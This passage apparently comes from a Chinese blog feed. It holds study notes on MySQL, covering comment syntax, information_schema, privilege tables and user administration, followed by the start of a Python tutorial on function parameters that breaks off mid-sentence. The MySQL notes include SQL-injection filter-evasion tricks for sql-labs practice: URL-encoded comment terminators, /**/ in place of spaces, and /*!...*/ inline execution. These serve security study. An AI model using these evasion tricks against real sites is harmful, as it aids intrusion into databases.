title="MySQL注释符"></a>MySQL注释符</h2><blockquote><p>在sql-labs游戏中，经常使用<code>--+</code>放在最后注释多余部分，而mysql中的注释符为<code>#</code>和<code>--</code> 却不能直接使用</p><p>有时候<code>#</code>这个注释符号呢会失效，原因是什么呢？解释如下：</p><p>url中<code>#</code>号是用来指导浏览器动作的（例如锚点），对服务器端完全无用。所以，HTTP请求中一般不包括<code>#</code></p><p>此时将#号改成url的编码<code>%23</code>就可以了，就可以在mysql中继续产生注释的意义</p><p>同样<code>--</code>使用的也时候也要注意后面要跟一个空格，不然也是无法注释的！！</p><p>url中无法存在空格，空格的url编码是<code>%20</code>，所以我们在注释的时候，要么用<code>+</code>来代替空格，或者使用<code>%20</code>，直接url编码</p><blockquote><p>在post表单中注入，就没这么多讲究了</p></blockquote><blockquote><p><a href="https://blog.csdn.net/xiayun1995/article/details/86500605">sql注入中的–+注释问题探索</a></p></blockquote></blockquote><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**/</span></span><br><span class="line">#</span><br><span class="line"><span class="comment">-- 或者--+         &gt;&gt;&gt;&gt;&gt;&gt;注意是&#x27;--空格&#x27;,--+之中的+可以代替空格</span></span><br></pre></td></tr></table></figure><h3 id="注释符可以替换空格"><a href="#注释符可以替换空格" class="headerlink" title="注释符可以替换空格"></a>注释符可以替换空格</h3><blockquote><p>在空格被过滤时可以用到</p></blockquote><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="comment">/*11213*/</span>id<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>users</span><br><span class="line">#此处<span class="comment">/**/</span>就代替了空格，一样的功能</span><br></pre></td></tr></table></figure><h3 id="内联注入"><a href="#内联注入" class="headerlink" title="内联注入"></a>内联注入</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*!/*!*/</span></span><br><span class="line"><span class="comment">/* */</span> 在mysql中是多行注释 但是如果里面加了<span class="operator">!</span> 那么后面的内容会被执行</span><br><span class="line"><span class="keyword">select</span><span class="comment">/*123*/</span><span class="operator">*</span><span class="comment">/*123*/</span><span class="keyword">from</span><span class="comment">/*！user*/</span></span><br><span class="line">#所执行的功能就类似于</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span></span><br></pre></td></tr></table></figure><h3 id="单行注释符后面加换行也是可以执行的"><a href="#单行注释符后面加换行也是可以执行的" class="headerlink" title="单行注释符后面加换行也是可以执行的"></a>单行注释符后面加换行也是可以执行的</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> #注释</span><br><span class="line"><span class="keyword">user</span></span><br></pre></td></tr></table></figure><h2 id="MySQL系统表"><a href="#MySQL系统表" class="headerlink" title="MySQL系统表"></a>MySQL系统表</h2><h3 id="information-schema"><a href="#information-schema" class="headerlink" title="information_schema"></a>information_schema</h3><p>在 MySQL中 ，把 information_schema  看作是一个数据库，确切说是信息数据库。其中保存着关于 MySQL  服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权限等。</p><p><strong>我们主要关注的就是这几个表：</strong></p><blockquote><ul><li>COLUMNS 表</li><li>TABLES 表</li><li>SCHEMATA 表</li></ul><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">-</span> SCHEMATA 表：提供了当前mysql实例中所有数据库的信息。</span><br><span class="line">    <span class="keyword">show</span> databases的结果取之此表。</span><br><span class="line">  </span><br><span class="line"><span class="operator">-</span> TABLES 表：提供了关于数据库中的表的信息。详细表述了某个表属于哪个schema，表类型，表引擎，创建时间等信息。</span><br><span class="line">    <span class="keyword">show</span> tables <span class="keyword">from</span> schemaname的结果取之此表。 </span><br><span class="line">    </span><br><span class="line"><span class="operator">-</span> COLUMNS 表：提供了表中的列信息。详细表述了某张表的所有列以及每个列的信息。</span><br><span class="line">    <span class="keyword">show</span> columns <span class="keyword">from</span> schemaname.tablename的结果取之此表。</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210091548948.png" alt="image-20221009154829312"></p></blockquote><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210091548874.png" alt="image-20221009154807594" style="zoom:33%;" /><h2 id="mysql数据库备份和恢复："><a href="#mysql数据库备份和恢复：" class="headerlink" title="mysql数据库备份和恢复："></a>mysql数据库备份和恢复：</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">.\mysqldump.exe <span class="operator">-</span>u admin123 <span class="operator">-</span>p <span class="comment">--default-character-set=utf8 --databases mathsite &gt; ../mathsite.sql</span></span><br><span class="line">#或者是dbeaver复制数据库生成的<span class="keyword">sql</span>文件，命令行mysqldump生成的<span class="keyword">sql</span>文件会乱码</span><br><span class="line"></span><br><span class="line">#导出的话就命令行导入</span><br><span class="line">mysql <span class="operator">-</span>uroot <span class="operator">-</span>p <span class="comment">--default-character-set=utf8 mathsite &lt; ../mathsite.sql</span></span><br><span class="line">#后期需要完整备份数据用navicat</span><br></pre></td></tr></table></figure><h2 id="MySql权限操作"><a href="#MySql权限操作" class="headerlink" title="MySql权限操作"></a>MySql权限操作</h2><p>Mysql可以在不同数据库使用不同用户操作</p><p>这样的好处是实现不同数据分离，即使hacker拿到一个用户权限也不会对其他数据造成太大影响。root是最高权限，可以查看所有数据库，如果是普通数据库就只能查看有限的数据库个数。</p><h3 id="一些关于MySql权限的说明"><a href="#一些关于MySql权限的说明" class="headerlink" title="一些关于MySql权限的说明"></a>一些关于MySql权限的说明</h3><h4 id="Mysql数据库下存放用户权限表的说明"><a href="#Mysql数据库下存放用户权限表的说明" class="headerlink" title="Mysql数据库下存放用户权限表的说明"></a>Mysql数据库下存放用户权限表的说明</h4><p>Mysql数据库用户权限存储在mysql库的<code>user, db, tables_priv, columns_priv, procs_priv</code>这几个系统表中， </p><p>MySQL实例启动后就加载到内存中，赋予其他数据库权限</p><table><thead><tr><th align="center">表名</th><th align="left">表的作用</th></tr></thead><tbody><tr><td align="center">user</td><td align="left">存放用户账户信息以及全局级别（所有数据库）权限，（存放了哪些用户可以访问哪些数据库的权限）</td></tr><tr><td align="center">db</td><td align="left">数据库级别权限，决定了来自哪些主机的哪些用户可以访问此数据库</td></tr><tr><td align="center">tables_priv</td><td align="left">存放表级别的权限，决定了来自哪些主机的哪些用户可以访问数据库的哪张表</td></tr><tr><td align="center">columns_priv</td><td align="left">存放列级别的权限，决定了来自哪些主机的哪些用户可以访问数据库表的字段</td></tr><tr><td align="center">procs_priv</td><td align="left">存放存储过程和函数级别的权限</td></tr></tbody></table><h4 id="mysql数据库所有权限"><a href="#mysql数据库所有权限" class="headerlink" title="mysql数据库所有权限"></a>mysql数据库所有权限</h4><table><thead><tr><th>权限名称</th><th>权限说明</th></tr></thead><tbody><tr><td>All&#x2F;All Privileges</td><td>全局或者全数据库对象级别的所有权限</td></tr><tr><td>Alter</td><td>修改表结构的权限，但必须要求有create和insert权限配合</td></tr><tr><td>Alter routine</td><td>修改或者删除存储过程、函数的权限</td></tr><tr><td>Create</td><td>创建新的数据库和表的权限</td></tr><tr><td>Create routine</td><td>允许创建存储过程、函数的权限</td></tr><tr><td>Create tablespace</td><td>允许创建、修改、删除表空间和日志组的权限</td></tr><tr><td>Create temporary tables</td><td>创建临时表权限</td></tr><tr><td>Create user</td><td>创建、修改、删除、重命名user</td></tr><tr><td>Create view</td><td>创建视图</td></tr><tr><td>Delete</td><td>删除行数据</td></tr><tr><td>drop</td><td>删除数据库、表、视图的权限，包括truncate table命令</td></tr><tr><td>Event</td><td>查询，创建，修改，删除MySQL事件</td></tr><tr><td>Execute</td><td>执行存储过程和函数</td></tr><tr><td>File在MySQL</td><td>可以访问的目录进行读写磁盘文件操作，可使用的命令包括load data infile,select ,into outfile,load file()函数等</td></tr><tr><td>Grant option</td><td>授权或者收回给其他用户你给予的权限</td></tr><tr><td>Index</td><td>创建和删除索引</td></tr><tr><td>Insert</td><td>在表里插入数据</td></tr><tr><td>Lock</td><td>对拥有select权限的表进行锁定，以防止其他链接对此表的读或写</td></tr><tr><td>Process</td><td>允许查看MySQL中的进程信息，比如执行show processlist, mysqladmin processlist, show engine等命令</td></tr><tr><td>Reference</td><td>允许创建外键</td></tr><tr><td>Reload</td><td>执行flush命令，指明重新加载权限表到系统内存中</td></tr><tr><td>Replication client</td><td>执行show master status,show slave status,show binary logs命令</td></tr><tr><td>Replication slave</td><td>允许slave主机通过此用户连接master以便建立主从复制关系</td></tr><tr><td>Select</td><td>从表中查看数据</td></tr><tr><td>Show databases</td><td>通过执行show databases命令查看所有的数据库名</td></tr><tr><td>Show view</td><td>通过执行show create view命令查看视图创建的语句</td></tr><tr><td>Shutdown</td><td>关闭数据库实例，执行语句包括mysqladmin shutdown</td></tr><tr><td>Super</td><td>允许执行一系列数据库管理命令，包括kill强制关闭某个连接命令，change master to创建复制关系命令，以及create&#x2F;alter&#x2F;drop server等命令</td></tr><tr><td>Trigger</td><td>允许创建，删除，执行，显示触发器的权限</td></tr><tr><td>Update</td><td>修改表中数据的权限</td></tr><tr><td>Usage</td><td>创建一个用户之后的默认权限，本身代表无权限</td></tr></tbody></table><h3 id="创建用户及授权"><a href="#创建用户及授权" class="headerlink" title="创建用户及授权"></a>创建用户及授权</h3><p>Mysql用户创建可以通过<code>create user/grant</code>命令创建，也可以通过<code>insert</code>语句直接操作MySQL系统权限表来创建。还可以限制不同IP的权限。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#创建用户：</span><br><span class="line">CREATE USER username@&#x27;host&#x27; IDENTIFIED BY &#x27;password&#x27;</span><br><span class="line">#用户授权：</span><br><span class="line">GRANT 权限关键字 ON database.tables TO username@host</span><br><span class="line">#创建用户并授权：</span><br><span class="line">GRANT 权限关键字 ON database.tables TO username@host WITH GRANT OPTION;</span><br><span class="line">#授予所有权限</span><br><span class="line">grant all privileges on *.* to username@host with grant option;</span><br><span class="line">#创建用户用户test通过192.168.0.0段ip地址登录的增删该查跟新库web的权限</span><br><span class="line">grant select,insert,update,delete,create,drop on web.* to test@192.168.%.% identified by &#x27;dayi123&#x27;;</span><br><span class="line">#限制登录来源IP</span><br><span class="line"># 给root用户授权可以通过192.168.0.0段地址登录</span><br><span class="line">grant all on *.* to root@192.168.%.% identified by &#x27;password&#x27;;</span><br></pre></td></tr></table></figure><blockquote><p><strong>说明：</strong></p><ul><li><p>MYSQL创建用户及给用户授权的用户名主机部分由两部分组成，分别为用户名和登录主机名，格式为<code>username@hostname</code>。hostname字段可以使用主机名或者ip地址，同时hostname字段允许使用”%”和”_”两种字符进行匹配。</p></li><li><p><code>IDENTIFIED BY</code>后面就是用户的密码</p></li><li><p><code>WITH GRANT OPTION</code> 这个选项表示该用户可以将自己拥有的权限授权给别人。</p><p>注意：经常有人在创建操作用户的时候不指定WITH GRANT OPTION选项导致后来该用户不能使用GRANT命令创建用户或者给其它用户授权。<br>如果不想这个用户有这个grant的权限，可以不加这句</p></li></ul></blockquote><h3 id="用户权限查看"><a href="#用户权限查看" class="headerlink" title="用户权限查看"></a>用户权限查看</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#查看已经授权给用户权限信息命令</span><br><span class="line">show grants for username@host;</span><br><span class="line">#查看创建用户的语句</span><br><span class="line">show create user username@host</span><br></pre></td></tr></table></figure><h3 id="收回用户权限"><a href="#收回用户权限" class="headerlink" title="收回用户权限"></a>收回用户权限</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#收回用户权限是可以通过语句revoke完成，命令格式为</span><br><span class="line">Revoke 权限关键字 on database.tables from username@host</span><br></pre></td></tr></table></figure><h3 id="设置用户密码"><a href="#设置用户密码" class="headerlink" title="设置用户密码"></a>设置用户密码</h3><p>Mysql数据库一般在创建用户时就给用户设置了密码，如果在用户创建完成后想修改密码，可通过相应的命令来完成。</p><h4 id="修改其他用户密码"><a href="#修改其他用户密码" class="headerlink" title="修改其他用户密码"></a>修改其他用户密码</h4><blockquote><p>当前用户要有权限修改，一般在root用户下操作</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#登录mysql后的修改命令：</span><br><span class="line">Alter user username@host identified by newpassword</span><br><span class="line">Set password for username@host=password(newpassword)</span><br><span class="line">Grant user on permission to user@host identified by newpassword</span><br><span class="line">#在系统命令行下修改：</span><br><span class="line">mysqladmin –u uername –h host password “newpassword”</span><br></pre></td></tr></table></figure><h4 id="修改当前用户密码"><a href="#修改当前用户密码" class="headerlink" title="修改当前用户密码"></a>修改当前用户密码</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alter user user() identified by newpassword</span><br><span class="line">set password=password(newpassword)</span><br></pre></td></tr></table></figure><h3 id="删除用户"><a href="#删除用户" class="headerlink" title="删除用户"></a>删除用户</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#删除命令</span><br><span class="line">drop user username@host</span><br></pre></td></tr></table></figure><h3 id="设置密码过期策略"><a href="#设置密码过期策略" class="headerlink" title="设置密码过期策略"></a>设置密码过期策略</h3><p>Mysql数据库用户同系统用户一样，可以设置密码过期策略，密码的过期天数可以在配置文件里面设置，也可以通过命令设置，通过命令为每个用户设置密码的过期天数则会覆盖系统配置文件中的设置。</p><h4 id="配置文件中设置"><a href="#配置文件中设置" class="headerlink" title="配置文件中设置"></a>配置文件中设置</h4><blockquote><p>选项：<code>default_password_lifetime</code>&#x3D;<code>”过期天数”</code> </p><p>如果设置为0，则密码永不过期</p></blockquote><h4 id="通过命令设置"><a href="#通过命令设置" class="headerlink" title="通过命令设置"></a>通过命令设置</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#设置过期天数</span><br><span class="line">alter user username@localhost password expire interval number day; </span><br><span class="line">#设置密码不过期</span><br><span class="line">alter user username@localhost password expire never; </span><br><span class="line">#默认过期策略</span><br><span class="line">alter user username@localhost password expire default; </span><br><span class="line">#手动强制密码过期</span><br><span class="line">alter user username@localhost password expire; </span><br></pre></td></tr></table></figure><h3 id="mysql数据库用户资源限制"><a href="#mysql数据库用户资源限制" class="headerlink" title="mysql数据库用户资源限制"></a>mysql数据库用户资源限制</h3><p>通过修改mysql数据库资源限制可以限制用户在某个时间段内连接mysql数据库的时间、执行语句的次数等。</p><h4 id="参数："><a href="#参数：" class="headerlink" title="参数："></a>参数：</h4><blockquote><ul><li><code>max_user_connections</code>：全局选项，限制所有用户在同一时间连接mysql数据库实例的数量</li><li><code>MAX_QUERIES_PER_HOUR</code>：一个用户在一个小时内可以执行查询的次数（基本包含所有语句）</li><li><code>MAX_UPDATES_PER_HOUR</code>：一个用户在一个小时内可以执行修改的次数（仅包含修改数据库或表的语句）</li><li><code>MAX_CONNECTIONS_PER_HOUR</code>：一个用户在一个小时内可以连接MySQL的时间</li><li><code>MAX_USER_CONNECTIONS</code>：一个用户可以在同一时间连接MySQL实例的数量</li></ul></blockquote><h4 id="设置mysql数据库用户资源限制"><a href="#设置mysql数据库用户资源限制" class="headerlink" title="设置mysql数据库用户资源限制"></a>设置mysql数据库用户资源限制</h4><blockquote><p>设置mysql数据库用户资源限制时可以在创建用户时设置，也可以在用户创建完成后通过命令设置。</p><p>当需要取消某个选项的，只需将某个选项的值设置为0即可。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 创建用户test,并对用户test的资源进行控制</span><br><span class="line">create user test@localhost identified by test with max_queries_per_hour 20 max_updates_per_hour 10 max_connections_per_hour 5 max_user_connections 2;  </span><br><span class="line"># 对用户test进行资源控制</span><br><span class="line">alter user test@localhost with max_queries_per_hour 20 max_updates_per_hour 10 max_connections_per_hour 5 max_user_connections 2;</span><br></pre></td></tr></table></figure><h1 id="数据库连接工具"><a href="#数据库连接工具" class="headerlink" title="数据库连接工具"></a>数据库连接工具</h1><blockquote><p>常见的Navicat,Dbeaver,phpmyadmin等</p></blockquote><h2 id="Dbeaver"><a href="#Dbeaver" class="headerlink" title="Dbeaver"></a>Dbeaver</h2><p>好用</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210091545497.png" alt="image-20221009154522189" style="zoom:33%;" /><hr><h1 id="refer"><a href="#refer" class="headerlink" title="refer"></a>refer</h1><blockquote><ul><li><a href="https://blog.csdn.net/wangyuxiang946/article/details/121058067">sql注入利用这个特性来判断列数以及显示位</a></li><li><a href="https://blog.csdn.net/xiayun1995/article/details/86500605">sql注入中的–+注释问题探索</a></li><li><a href="https://blog.csdn.net/dayi_123/article/details/82989264">(3条消息) mysql数据库用户及用户权限管理_dayi_123的博客-CSDN博客_数据库用户管理</a></li><li><a href="https://kalacloud.com/blog/how-to-list-all-users-in-mysql/">MySQL查看所有用户 - MySQL 系列教程 - 卡拉云 (kalacloud.com)</a></li></ul></blockquote><blockquote><p><strong>声明：</strong></p><ol><li><p>若文章存在错误，望诸君不吝指正^</p></li><li><p>部分笔记由于年代久远，做的笔记找不到最初是引用谁的，若是不允许引用转载，请联系我</p></li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> WEB安全 </category>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>5. 函数进阶</title>
      <link href="/Python%E5%85%A8%E6%A0%88/Python%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B/5.%20%E5%87%BD%E6%95%B0%E8%BF%9B%E9%98%B6.html"/>
      <url>/Python%E5%85%A8%E6%A0%88/Python%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B/5.%20%E5%87%BD%E6%95%B0%E8%BF%9B%E9%98%B6.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>函数的参数高级用法、拆包、引用、匿名函数、递归</p><h1 id="函数参数的高级用法"><a href="#函数参数的高级用法" class="headerlink" title="函数参数的高级用法"></a>函数参数的高级用法</h1><blockquote><p><strong>注意：</strong>在形参和实参中有不同的体现，下面会具体的一一介绍到</p><p>形参：</p><blockquote><p>位置形参 &lt; 默认形参 &lt; 不定长形参</p></blockquote><p>实参:</p><blockquote><p>位置实参 &lt; 关键字实参 &lt; <code>*args</code>打散序列类型 &lt;<code>**kwargs</code>打散散列类型</p></blockquote></blockquote><h2 id="位置参数"><a href="#位置参数" class="headerlink" title="位置参数"></a>位置参数</h2><blockquote><p>**函数调用时,根据形参的位置进行传递参数:**位置必须以一对应,缺一不可</p><p>位置参数，有时也称必备参数，指的是必须按照正确的顺序将实际参数传到函数中，换句话说，调用函数时传入实际参数的数量和位置都必须和定义函数时保持一致</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">print_hello</span>(<span class="params">name, sex</span>):</span><br><span class="line">    sex_dict = &#123;<span class="number">1</span>: <span class="string">u&#x27;先生&#x27;</span>, <span class="number">2</span>: <span class="string">u&#x27;女士&#x27;</span>&#125;</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;hello %s %s, welcome to python world!&#x27;</span> %(name, sex_dict.get(sex, <span class="string">u&#x27;先生&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 两个参数的顺序必须一一对应，且少一个参数都不可以</span></span><br><span class="line"><span class="comment"># print_hello(&#x27;tanggu&#x27;, 1)</span></span><br></pre></td></tr></table></figure><h2 id="默认参数"><a href="#默认参数" class="headerlink" title="默认参数"></a>默认参数</h2><h3 id="引入"><a href="#引入" class="headerlink" title="引入"></a>引入</h3><p><code>default</code>参数也叫做默认参数，是指定义函数时形参变量有默认值，如果调用函数时没有传递参数，那么函数就用默认值，如果传递了参数就用传递的那个数据。<strong>会覆盖形参</strong></p><p>示例：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">print_info</span>(<span class="params">name, age=<span class="number">35</span></span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;name: <span class="subst">&#123;name&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;age: <span class="subst">&#123;age&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">print_info(<span class="string">&#x27;顾安&#x27;</span>)</span><br><span class="line">print_info(<span class="string">&#x27;顾安&#x27;</span>, <span class="number">18</span>)</span><br></pre></td></tr></table></figure><h3 id="默认参数的作用"><a href="#默认参数的作用" class="headerlink" title="默认参数的作用"></a>默认参数的作用</h3><p>当调用函数时，有些参数不必传递，而是用默认值，这样的场景往往都用默认参数</p><p>例如，一个学校现在开始检查每个学生的信息，学生说：报告老师我是xxx学校xxx系xxx年级xxx班学生，名字叫xxxx，大家想只要是这学校的学生那么“xxx学校”就可以省略不用说了，因为大家都知道。所以就可以认为默认的学校就是xxx，而当其他学校的学生介绍时yyy学校名字案例说就一定要说清楚，否则让人弄混了。</p><p>示例：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">print_info</span>(<span class="params">name, class_name, grade, department_name, school_name=<span class="string">&quot;图灵学院&quot;</span></span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;老师好：我是来自 %s(大学) %s系 %s年级 %s班级 的学生，我叫%s&quot;</span> % (</span><br><span class="line">        school_name,</span><br><span class="line">        department_name,</span><br><span class="line">        grade,</span><br><span class="line">        class_name,</span><br><span class="line">        name</span><br><span class="line">    ))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print_info(<span class="string">&quot;顾安&quot;</span>, <span class="string">&quot;爬虫&quot;</span>, <span class="string">&quot;二&quot;</span>, <span class="string">&quot;软件工程&quot;</span>)</span><br><span class="line">print_info(<span class="string">&quot;顾安&quot;</span>, <span class="string">&quot;爬虫&quot;</span>, <span class="string">&quot;二&quot;</span>, <span class="string">&quot;软件工程&quot;</span>, <span class="string">&quot;图灵python&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h3><ul><li>默认参数只能<strong>在形参的最后</strong>（即最后侧），所有位置参数必须出现在默认参数前，包括函数定义和调用</li><li><strong>默认参数全挨在一起</strong>（在右侧），非默认参数也挨在一起（在左侧）</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">def</span> <span class="title function_">printinfo</span>(<span class="params">name, age=<span class="number">35</span>, sex</span>):</span><br><span class="line"><span class="meta">... </span>    <span class="built_in">print</span> name</span><br><span class="line">...</span><br><span class="line">File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span></span><br><span class="line">SyntaxError: non-default argument follows default argument</span><br></pre></td></tr></table></figure><h2 id="命名参数（关键字参数）"><a href="#命名参数（关键字参数）" class="headerlink" title="命名参数（关键字参数）"></a>命名参数（关键字参数）</h2><blockquote><p>也称呼做<strong>关键字参数:只需要书写正确的形参名称</strong></p></blockquote><h3 id="引入-1"><a href="#引入-1" class="headerlink" title="引入"></a>引入</h3><p>命名参数是指：在调用函数时，传递的实参带有名字，这样的参数叫做<strong>命名参数</strong></p><p>示例：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;-----&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;a=<span class="subst">&#123;a&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;b=<span class="subst">&#123;b&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">test(<span class="number">11</span>, <span class="number">22</span>)</span><br><span class="line">test(a=<span class="number">11</span>, b=<span class="number">22</span>)</span><br><span class="line">test(a=<span class="number">22</span>, b=<span class="number">11</span>)  <span class="comment"># 根据名称将值传入到指定的变量中</span></span><br></pre></td></tr></table></figure><h3 id="命名参数的作用"><a href="#命名参数的作用" class="headerlink" title="命名参数的作用"></a>命名参数的作用</h3><p>命名参数能够在调用函数的时候，<strong>不受位置的影响，可以给需要的参数指定传递数据</strong></p><h3 id="注意点-1"><a href="#注意点-1" class="headerlink" title="注意点"></a>注意点</h3><ul><li>命名参数的名字要与形参中的<strong>名字相同</strong>，不能出现命名参数名字叫做<code>num</code>，而形参中没有变量<code>num</code></li><li>如果形参左侧有普通的形参，调用函数时传递的参数一定要先满足这些形参，然后再根据需要编写命名参数</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>(<span class="params">a, b, c=<span class="number">100</span>, d=<span class="number">200</span></span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;a=%d, b=%d, c=%d, d=%d&quot;</span> % (a, b, c, d))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 下面的方式都成功</span></span><br><span class="line">test(<span class="number">11</span>, <span class="number">22</span>)</span><br><span class="line">test(<span class="number">11</span>, <span class="number">22</span>, <span class="number">33</span>)</span><br><span class="line">test(<span class="number">11</span>, <span class="number">22</span>, <span class="number">33</span>, <span class="number">44</span>)</span><br><span class="line">test(<span class="number">11</span>, <span class="number">22</span>, d=<span class="number">33</span>, c=<span class="number">44</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 下面的方式都失败</span></span><br><span class="line">test(c=<span class="number">1</span>, d=<span class="number">2</span>)  <span class="comment"># 缺少a、b的值</span></span><br><span class="line">test(c=<span class="number">1</span>, d=<span class="number">2</span>, <span class="number">11</span>, <span class="number">22</span>)  <span class="comment"># 11, 22应该在左侧</span></span><br></pre></td></tr></table></figure><h3 id="位置参数和关键字参数使用注意事项"><a href="#位置参数和关键字参数使用注意事项" class="headerlink" title="位置参数和关键字参数使用注意事项:"></a>位置参数和关键字参数使用注意事项:</h3><blockquote><ul><li>有<strong>位置参数</strong>时,<strong>命名参数(关键字参数)<strong>要放在</strong>位置参数</strong>的后面</li><li>不能对一个形参多次传值</li><li>当存在多个**命名参数(关键字参数)**时,参数位置不分先后</li></ul></blockquote><h2 id="不定长参数"><a href="#不定长参数" class="headerlink" title="不定长参数"></a>不定长参数</h2><h3 id="引入-2"><a href="#引入-2" class="headerlink" title="引入"></a>引入</h3><p>不定长参数：定义函数的时候形参可以<strong>不确定到底多少个</strong>，这样的参数就叫做不定长参数</p><p>不定长参数有2种方式表示</p><ul><li><code>*args</code> ：表示调用函数时多余的**<u>未命名参数</u><strong>都会以</strong>元组**的方式存储到<code>args</code>中</li><li><code>**kwargs</code>：表示调用函数时多余的**<u>命名参数</u><strong>都会以</strong>键值对**的方式存储到<code>kwargs</code>中</li></ul><p>注意：</p><ul><li>在定义的时候，<code>*</code>和<code>**</code>是必须要写的，否则就变成了普通的形参了</li><li>当我们说不定长参数的时候，就是指<code>*args</code>和<code>**kwargs</code></li><li>在传递参数的时候可以<strong>直接传递多个参数</strong>，如下：</li></ul><blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>(<span class="params">a, b, *args, **kwargs</span>):</span><br><span class="line">    <span class="built_in">print</span>(a, <span class="built_in">type</span>(a))</span><br><span class="line">    <span class="built_in">print</span>(b, <span class="built_in">type</span>(b))</span><br><span class="line">    <span class="built_in">print</span>(args, <span class="built_in">type</span>(args))</span><br><span class="line">    <span class="built_in">print</span>(kwargs, <span class="built_in">type</span>(kwargs))</span><br><span class="line"></span><br><span class="line">test(<span class="number">11</span>, <span class="number">22</span>, <span class="number">33</span>, <span class="number">44</span>, <span class="number">55</span>, <span class="number">66</span>, name=<span class="string">&#x27;顾安&#x27;</span>, address=<span class="string">&#x27;长沙&#x27;</span>)</span><br></pre></td></tr></table></figure></blockquote><ul><li>也可以用<code>*</code>和<code>**</code>包裹起来传递不定长参数：</li></ul><blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">fn</span>(<span class="params">*args,**kargs</span>):</span><br><span class="line"><span class="built_in">print</span>(args[<span class="number">2</span>],kargs[<span class="string">&quot;age&quot;</span>])</span><br><span class="line"></span><br><span class="line">fn(*(<span class="number">5</span>,<span class="number">8</span>,<span class="number">10</span>),**&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;柯南&quot;</span>,<span class="string">&quot;age&quot;</span>:<span class="number">28</span>&#125;)</span><br></pre></td></tr></table></figure><p>在调用函数的时候也可以加(<code>*</code>)星号，为什么呢？</p><p>加星<code>*</code>和<code>**</code>拆包一般叫解构或者展开，在Python中叫<strong>拆包</strong></p><p>后面会介绍到如何拆包</p></blockquote><h3 id="不定长参数的作用"><a href="#不定长参数的作用" class="headerlink" title="不定长参数的作用"></a>不定长参数的作用</h3><p>通过不定长参数，能够实现调用函数时传递实参个数可以随意变换的需求</p><h3 id="注意点-2"><a href="#注意点-2" class="headerlink" title="注意点"></a>注意点</h3><ul><li>加了星号<code>*</code>的变量<code>args</code>会存放所有未命名的变量参数，<code>args</code>为元组</li><li>而加<code>**</code>的变量<code>kwargs</code>会存放命名参数，即形如<code>key=value</code>的参数， 